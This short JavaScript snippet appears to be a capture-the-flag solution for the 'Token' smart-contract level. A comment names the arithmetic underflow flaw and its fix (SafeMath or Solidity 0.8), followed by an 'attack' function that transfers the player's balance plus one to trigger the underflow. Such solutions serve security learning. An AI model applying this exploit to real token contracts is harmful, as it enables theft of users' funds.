/**

Token
 
Vulnerability: 
Arithmetic Over/Underflows

Preventative Techniques:
Use SafeMath or v0.8 to revert on arithmetic over/underflows

*/

const attack = async () => {

    const pseudoAddress = contract.address;

    const playerBalance = await contract.balanceOf(player);

    await contract.transfer(pseudoAddress, playerBalance + 1);
}
